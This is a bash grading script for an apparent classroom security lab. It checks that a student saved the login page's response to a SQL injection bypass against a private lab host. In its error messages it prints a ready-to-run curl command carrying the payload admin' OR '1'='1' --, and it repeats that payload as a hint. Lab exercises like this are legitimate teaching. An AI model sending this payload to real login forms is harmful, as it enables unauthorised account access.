#!/bin/bash
# Verify: SQLi response captured; stamped. The BHB lab's login.php responds
# distinctly to the bypass payload.

WORK="$HOME/kali-class-work/sec-wk08"
FILE="$WORK/sqli-login.txt"

if [ ! -s "$FILE" ]; then
    echo "$FILE is missing or empty." >&2
    echo "curl -s -X POST http://172.16.10.12/login.php -d \"username=admin' OR '1'='1' -- &password=x\" -o $FILE" >&2
    exit 1
fi

STAMP=$(kali-class check-stamp sec-wk08 sqli 2>/dev/null)
if [ $? -ne 0 ]; then
    echo "$STAMP" >&2
    exit 1
fi

# Accept either the app's success marker or evidence the request reached the
# app (some BHB builds return different markers). A failed/empty login page
# without any HTTP evidence fails.
if grep -qiE "(welcome|dashboard|session|logged in|authenticated)" "$FILE"; then
    exit 0
fi

if grep -qE "^(<|HTTP)" "$FILE"; then
    echo "Response captured but no success marker — recheck the payload (admin' OR '1'='1' -- )" >&2
    exit 1
fi

echo "$FILE has content but doesn't look like an HTTP response." >&2
exit 1